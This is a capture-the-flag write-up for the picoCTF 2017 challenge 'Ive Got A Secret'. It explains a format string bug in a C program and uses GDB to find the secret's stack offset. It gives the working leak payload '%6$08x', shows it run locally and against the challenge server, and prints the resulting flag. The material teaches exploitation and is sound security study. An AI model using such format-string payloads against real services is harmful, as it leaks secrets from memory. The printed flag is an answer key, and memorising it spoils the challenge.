# Ive Got A Secret [ 75 Pts ]

## Problem

Hopefully you can find the right format for my [secret](./secret)! [Source](./secret.c). Connect on shell2017.picoctf.com:10750.

## Approach

```
     1	#include <stdio.h>
     2	#include <fcntl.h>
     3	#include <unistd.h>
     4	#include <stdlib.h>
     5	
     6	#define BUF_LEN 64
     7	char buffer[BUF_LEN];
     8	
     9	int main(int argc, char** argv) {
    10	    int fd = open("/dev/urandom", O_RDONLY);
    11	    if(fd == -1){
    12	        puts("Open error on /dev/urandom. Contact an admin\n");
    13	        return -1;
    14	    }
    15	    int secret;
    16	    if(read(fd, &secret, sizeof(int)) != sizeof(int)){
    17	        puts("Read error. Contact admin!\n");
    18	        return -1;
    19	    }
    20	    close(fd);
    21	    printf("Give me something to say!\n");
    22	    fflush(stdout);
    23	    fgets(buffer, BUF_LEN, stdin);
    24	    printf(buffer);
    25	
    26	    int not_secret;
    27	    printf("Now tell my secret in hex! Secret: ");
    28	    fflush(stdout);
    29	    scanf("%x", &not_secret);
    30	    if(secret == not_secret){
    31	        puts("Wow, you got it!");
    32	        system("cat ./flag.txt");   
    33	    }else{
    34	        puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
    35	    }
    36	
    37	    return 0;
    38	}
```
### Vulnerability - format string attack

From the source code, the vulnerability is on line 24. printf's first parameter is for format string. 
When the first parameter contains metacharacters like %x, %d, %s, %n, etc, these are treated as control data instead of user data.
printf will proceed to access values on the stack, printing them onto the screen.

```
$ ./secret 
Give me something to say!
%08x.%08x.%08x
00000040.f77955a0.08048792
Now tell my secret in hex! Secret: 
```

From the above, we can see 3 values on the stack just by inputting %x.
Since 'secret' is a local variable, its value is stored on the stack and is readable by the attacker.

The attacker just have to guess at which position variable is located and use it for authentication.

### GDB

Via reverse engineering, an attacker may not need to guess the position but accurately pinpoint which offset is the correct value.

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080485eb <+0>:	lea    ecx,[esp+0x4]
   0x080485ef <+4>:	and    esp,0xfffffff0
   0x080485f2 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080485f5 <+10>:	push   ebp
   0x080485f6 <+11>:	mov    ebp,esp
   0x080485f8 <+13>:	push   ecx
   0x080485f9 <+14>:	sub    esp,0x14
   0x080485fc <+17>:	sub    esp,0x8
   0x080485ff <+20>:	push   0x0
   0x08048601 <+22>:	push   0x80487d0
   0x08048606 <+27>:	call   0x80484b0 <open@plt>
   0x0804860b <+32>:	add    esp,0x10
   0x0804860e <+35>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048611 <+38>:	cmp    DWORD PTR [ebp-0xc],0xffffffff
   0x08048615 <+42>:	jne    0x8048631 <main+70>
   0x08048617 <+44>:	sub    esp,0xc
   0x0804861a <+47>:	push   0x80487e0
   0x0804861f <+52>:	call   0x8048480 <puts@plt>
   0x08048624 <+57>:	add    esp,0x10
   0x08048627 <+60>:	mov    eax,0xffffffff
   0x0804862c <+65>:	jmp    0x8048731 <main+326>
   0x08048631 <+70>:	sub    esp,0x4
   0x08048634 <+73>:	push   0x4
   0x08048636 <+75>:	lea    eax,[ebp-0x10]
   0x08048639 <+78>:	push   eax
   0x0804863a <+79>:	push   DWORD PTR [ebp-0xc]
   0x0804863d <+82>:	call   0x8048440 <read@plt>
   0x08048642 <+87>:	add    esp,0x10
   0x08048645 <+90>:	cmp    eax,0x4
   0x08048648 <+93>:	je     0x8048664 <main+121>
   0x0804864a <+95>:	sub    esp,0xc
   0x0804864d <+98>:	push   0x804880e
   0x08048652 <+103>:	call   0x8048480 <puts@plt>
   0x08048657 <+108>:	add    esp,0x10
   0x0804865a <+111>:	mov    eax,0xffffffff
   0x0804865f <+116>:	jmp    0x8048731 <main+326>
   0x08048664 <+121>:	sub    esp,0xc
   0x08048667 <+124>:	push   DWORD PTR [ebp-0xc]
   0x0804866a <+127>:	call   0x80484e0 <close@plt>
   0x0804866f <+132>:	add    esp,0x10
   0x08048672 <+135>:	sub    esp,0xc
   0x08048675 <+138>:	push   0x804882a
   0x0804867a <+143>:	call   0x8048480 <puts@plt>
   0x0804867f <+148>:	add    esp,0x10
   0x08048682 <+151>:	mov    eax,ds:0x8049b20
   0x08048687 <+156>:	sub    esp,0xc
   0x0804868a <+159>:	push   eax
   0x0804868b <+160>:	call   0x8048460 <fflush@plt>
   0x08048690 <+165>:	add    esp,0x10
   0x08048693 <+168>:	mov    eax,ds:0x8049b00
   0x08048698 <+173>:	sub    esp,0x4
   0x0804869b <+176>:	push   eax
   0x0804869c <+177>:	push   0x40
   0x0804869e <+179>:	push   0x8049b40
   0x080486a3 <+184>:	call   0x8048470 <fgets@plt>
   0x080486a8 <+189>:	add    esp,0x10
   0x080486ab <+192>:	sub    esp,0xc
   0x080486ae <+195>:	push   0x8049b40
   0x080486b3 <+200>:	call   0x8048450 <printf@plt>
   0x080486b8 <+205>:	add    esp,0x10
   0x080486bb <+208>:	sub    esp,0xc
   0x080486be <+211>:	push   0x8048844
   0x080486c3 <+216>:	call   0x8048450 <printf@plt>
   0x080486c8 <+221>:	add    esp,0x10
   0x080486cb <+224>:	mov    eax,ds:0x8049b20
   0x080486d0 <+229>:	sub    esp,0xc
   0x080486d3 <+232>:	push   eax
   0x080486d4 <+233>:	call   0x8048460 <fflush@plt>
   0x080486d9 <+238>:	add    esp,0x10
   0x080486dc <+241>:	sub    esp,0x8
   0x080486df <+244>:	lea    eax,[ebp-0x14]
   0x080486e2 <+247>:	push   eax
   0x080486e3 <+248>:	push   0x8048868
   0x080486e8 <+253>:	call   0x80484d0 <__isoc99_scanf@plt>
   0x080486ed <+258>:	add    esp,0x10
   0x080486f0 <+261>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080486f3 <+264>:	mov    eax,DWORD PTR [ebp-0x14]
   0x080486f6 <+267>:	cmp    edx,eax
   0x080486f8 <+269>:	jne    0x804871c <main+305>
   0x080486fa <+271>:	sub    esp,0xc
   0x080486fd <+274>:	push   0x804886b
   0x08048702 <+279>:	call   0x8048480 <puts@plt>
   0x08048707 <+284>:	add    esp,0x10
   0x0804870a <+287>:	sub    esp,0xc
   0x0804870d <+290>:	push   0x804887c
   0x08048712 <+295>:	call   0x8048490 <system@plt>
   0x08048717 <+300>:	add    esp,0x10
   0x0804871a <+303>:	jmp    0x804872c <main+321>
   0x0804871c <+305>:	sub    esp,0xc
   0x0804871f <+308>:	push   0x804888c
   0x08048724 <+313>:	call   0x8048480 <puts@plt>
   0x08048729 <+318>:	add    esp,0x10
   0x0804872c <+321>:	mov    eax,0x0
   0x08048731 <+326>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048734 <+329>:	leave  
   0x08048735 <+330>:	lea    esp,[ecx-0x4]
   0x08048738 <+333>:	ret    
End of assembler dump.
gdb-peda$ break *main+132
Breakpoint 1 at 0x804866f
```

I have placed a break point after the file to '/dev/urandom' is closed.
This ensures that the secret is loaded.

```
gdb-peda$ run <<< $(python -c "print 10*'%08x.'")
Starting program: /home/misskanari/fun/ctf/pico2017/PicoCtf2017-Write-up/level2/bin/IveGotASecret_75/secret <<< $(python -c "print 10*'%08x.'")

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffce98 --> 0x66058af3 
EDX: 0x0 
ESI: 0xf7faa000 --> 0x1b1db0 
EDI: 0xf7faa000 --> 0x1b1db0 
EBP: 0xffffcea8 --> 0x0 
ESP: 0xffffce80 --> 0x3 
EIP: 0x804866f (<main+132>:	add    esp,0x10)
EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048664 <main+121>:	sub    esp,0xc
   0x8048667 <main+124>:	push   DWORD PTR [ebp-0xc]
   0x804866a <main+127>:	call   0x80484e0 <close@plt>
=> 0x804866f <main+132>:	add    esp,0x10
   0x8048672 <main+135>:	sub    esp,0xc
   0x8048675 <main+138>:	push   0x804882a
   0x804867a <main+143>:	call   0x8048480 <puts@plt>
   0x804867f <main+148>:	add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xffffce80 --> 0x3 
0004| 0xffffce84 --> 0xffffce98 --> 0x66058af3 
0008| 0xffffce88 --> 0x4 
0012| 0xffffce8c --> 0x8048792 (<__libc_csu_init+82>:	add    edi,0x1)
0016| 0xffffce90 --> 0x1 
0020| 0xffffce94 --> 0xffffcf54 --> 0xffffd11d ("/home/misskanari/fun/ctf/pico2017/PicoCtf2017-Write-up/level2/bin/IveGotASecret_75/secret")
0024| 0xffffce98 --> 0x66058af3 
0028| 0xffffce9c --> 0x3 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804866f in main ()
```

I inserted 10 %08x to print out 10 positions of the stack.
When the program runs, it stopped at the file close instruction.

```
   0x08048634 <+73>:    push   0x4
   0x08048636 <+75>:    lea    eax,[ebp-0x10]
   0x08048639 <+78>:    push   eax
   0x0804863a <+79>:    push   DWORD PTR [ebp-0xc]
   0x0804863d <+82>:    call   0x8048440 <read@plt>
```

The above snippet and the source code line 16 tells me that 'secret' is located at $ebp-0x10.
This is because in x86 assembly, functions receive arguments by having them push onto the stack.

|stack|
|-----|
|saved ebp|
|retn addr|
|arg1|
|arg2|


```
gdb-peda$ x/x $ebp-0x10
0xffffce98:	0x66058af3
gdb-peda$ c
Continuing.
Give me something to say!
00000040.f7faa5a0.08048792.00000001.ffffcf54.66058af3.00000003.f7faa3dc.ffffcec0.00000000.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
[Inferior 1 (process 15865) exited normally]
Warning: not running or target is remote
```

From the above, we can accurately say that variable secret is located at 6th position of the stack and can be accessed directly with POSIX syntax `%6$08x`.

### Local

```
$ echo Flag{SampleFlag} > flag.txt

$ ./secret 
Give me something to say!
%6$08x
5fd740d3
Now tell my secret in hex! Secret: 5fd740d3
Wow, you got it!
Flag{SampleFlag}
```

### Remote

$ nc shell2017.picoctf.com 10750
Give me something to say!
%6$08x
06ad87b1
Now tell my secret in hex! Secret: 06ad87b1
1ba85d212f80746e0c61b8d45bc690b6
Wow, you got it!

(Completed)
